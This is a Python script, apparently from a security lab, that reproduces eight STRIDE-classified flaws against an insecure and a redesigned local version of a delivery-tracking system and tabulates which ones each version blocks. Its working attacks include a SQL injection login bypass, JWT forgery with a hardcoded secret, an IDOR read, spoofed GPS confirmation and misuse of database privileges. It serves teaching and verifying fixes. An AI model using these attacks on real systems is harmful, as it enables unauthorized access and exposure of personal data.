"""As falhas do diagnóstico, reproduzidas contra as duas versões do sistema.

Cada ataque devolve (explorado, evidência). "explorado = sim" significa que a falha existe naquela versão.
Uso: python ataques.py            (roda todos contra as duas versões e imprime a tabela)
"""
import os
import time

import httpx
import jwt
import psycopg

URLS = {"inseguro": os.environ.get("INSEGURO", "http://localhost:8701"),
        "seguro": os.environ.get("SEGURO", "http://localhost:8702")}
DBS = {"inseguro": os.environ.get("NOTIF_DB_INSEGURO", "postgresql://admin:admin-lab@localhost:5432/inseguro"),
       "seguro": os.environ.get("NOTIF_DB_SEGURO", "postgresql://notif_seg:notif-seg-lab@localhost:5432/seguro")}
http = httpx.Client(timeout=10)


def entrar(base: str, nome: str, senha: str) -> str:
    r = http.post(f"{base}/login", json={"nome": nome, "senha": senha})
    r.raise_for_status()
    return r.json()["token"]


def auth(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


# F1 (Spoofing): o segredo do JWT está no código; quem o lê forja um token de operador
def f1(v, base):
    forjado = jwt.encode({"sub": "ana", "uid": 1, "papel": "operador"}, "luna-secret-123", algorithm="HS256")
    r = http.get(f"{base}/relatorio", headers=auth(forjado))
    return r.status_code == 200, f"token de operador forjado com o segredo do codigo: http {r.status_code}"


# F2 (Spoofing): o token nunca expira, então um token roubado vale para sempre
def f2(v, base):
    claims = jwt.decode(entrar(base, "bruno", "bruno123"), options={"verify_signature": False})
    return "exp" not in claims, f"claims do token: {sorted(claims)}"


# F3 (Tampering / Elevation): injeção de SQL no login, sem conhecer a senha
def f3(v, base):
    r = http.post(f"{base}/login", json={"nome": "ana' --", "senha": "qualquer"})
    return r.status_code == 200, f"login como 'ana' sem a senha (nome=\"ana' --\"): http {r.status_code}"


# F4 (Information disclosure): o servidor devolve dados de todos; o filtro "só os meus" fica no navegador
def f4(v, base):
    token = entrar(base, "bruno", "bruno123")
    dados = http.get(f"{base}/entregas", headers=auth(token)).json()
    de_outros = [e for e in dados if e["motorista_id"] != 2]
    tem_cpf = any("cpf" in e for e in dados)
    return bool(de_outros), f"bruno recebe {len(dados)} entregas ({len(de_outros)} de outros motoristas); campo CPF presente: {tem_cpf}"


# F5 (Information disclosure): IDOR, a entrega 2 é da carla e o bruno a lê pelo id
def f5(v, base):
    token = entrar(base, "bruno", "bruno123")
    r = http.get(f"{base}/entregas/2", headers=auth(token))
    return r.status_code == 200, f"bruno consulta a entrega 2 (da carla): http {r.status_code}"


# F6 (Tampering): o motorista confirma a entrega de qualquer lugar
def f6(v, base):
    token = entrar(base, "bruno", "bruno123")
    r = http.post(f"{base}/entregas/1/confirmar", headers=auth(token),
                  json={"lat": 35.6762, "lon": 139.6503, "ts": int(time.time())})      # Tóquio
    return r.status_code == 200, f"confirmar a entrega 1 a partir de Toquio: http {r.status_code}"


# F7 (Repudiation): depois de uma confirmação, é possível saber quem, quando e de onde?
def f7(v, base):
    if v == "seguro":      # no sistema redesenhado ainda não houve confirmação válida: faz a confirmação legítima
        token = entrar(base, "bruno", "bruno123")
        http.post(f"{base}/entregas/1/confirmar", headers=auth(token),
                  json={"lat": -23.5614, "lon": -46.6559, "ts": int(time.time())})       # no endereço
    operador = entrar(base, "ana", "ana123")
    r = http.get(f"{base}/auditoria/1", headers=auth(operador))
    if r.status_code == 200:
        ultimo = r.json()[-1]
        return False, f"trilha: {ultimo['usuario']} confirmou de {ultimo['origem']} em {ultimo['em'][:19]} (hash {ultimo['hash']})"
    return True, f"auditoria da confirmacao: http {r.status_code} (ninguem sabe quem confirmou)"


# F8 (Elevation of privilege): se o serviço de notificação for invadido, o que a credencial dele permite?
def f8(v, base):
    resultados = []
    with psycopg.connect(DBS[v], autocommit=False) as c:
        for descricao, sql in [("ler CPFs", "SELECT cpf FROM entregas LIMIT 1"),
                               ("alterar entregas", "UPDATE entregas SET status = 'entregue' WHERE id = 3")]:
            try:
                c.execute(sql)
                resultados.append(f"{descricao}: PERMITIDO")
            except psycopg.errors.InsufficientPrivilege:
                resultados.append(f"{descricao}: negado")
                c.rollback()
        c.rollback()      # nada é gravado
    return any("PERMITIDO" in r for r in resultados), "; ".join(resultados)


FALHAS = [("F1", "Spoofing", "segredo do JWT no codigo", f1), ("F2", "Spoofing", "token sem expiracao", f2),
          ("F3", "Tampering", "injecao de SQL no login", f3), ("F4", "Info disclosure", "autorizacao so no front-end", f4),
          ("F5", "Info disclosure", "acesso por id (IDOR)", f5), ("F6", "Tampering", "GPS forjado na confirmacao", f6),
          ("F7", "Repudiation", "sem trilha de auditoria", f7), ("F8", "Elevation", "banco compartilhado e administrador", f8)]

if __name__ == "__main__":
    print(f"{'':<4}{'STRIDE':<16}{'falha':<38}{'inseguro':<12}{'seguro':<10}")
    detalhes = []
    for codigo, stride, nome, funcao in FALHAS:
        r = {}
        for versao in ("inseguro", "seguro"):
            try:
                r[versao] = funcao(versao, URLS[versao])
            except Exception as erro:       # uma falha de execução não pode passar por "barrado"
                r[versao] = (None, f"erro: {erro}")
        marca = lambda x: "ERRO" if x[0] is None else ("EXPLORADO" if x[0] else "barrado")
        print(f"{codigo:<4}{stride:<16}{nome:<38}{marca(r['inseguro']):<12}{marca(r['seguro']):<10}")
        detalhes.append((codigo, r))
    print("\nEvidencias:")
    for codigo, r in detalhes:
        print(f"  {codigo}  inseguro: {r['inseguro'][1]}\n      seguro  : {r['seguro'][1]}")
